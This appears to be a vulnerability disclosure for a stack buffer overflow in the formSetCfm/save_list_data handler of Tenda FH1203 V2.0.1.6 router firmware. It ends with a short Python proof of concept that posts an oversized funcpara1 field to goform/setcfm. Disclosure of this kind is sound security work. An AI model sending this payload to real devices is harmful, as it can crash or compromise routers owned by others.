## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2495.html

## Affected version

FH1203 V2.0.1.6

## Vulnerability details

The Tenda FH1203 V2.0.1.6 firmware has a stack overflow vulnerability located in the `formSetCfm` function. This function accepts the `funcpara1` parameter from a POST request and passes it to the `save_list_data` function. Within `save_list_data`, the array `v10` is fixed at 64 bytes. However, since the user has control over the input of `funcpara1`, the statement `sprintf(v10, "%s.list%d", a1, v6);` leads to a buffer overflow. The user-supplied `funcpara1` can exceed the capacity of the `v10` array, thus triggering this security vulnerability.

![image-20240319133131680](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319133131680.png)

![image-20240319133412555](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319133412555.png)

![image-20240319133403710](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319133403710.png)

## POC

```python
import requests as re

s = re.Session()
url_base = 'http://192.168.84.101/'

# Send payload
url = url_base + 'goform/setcfm'
data = {
        'funcname': 'save_list_data', 
        'funcpara1': b'a'*0x500, 
        'funcpara2':'aaaaaa'
}

res = re.post(url, data=data)
```

![image-20240320014040117](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240320014040117.png)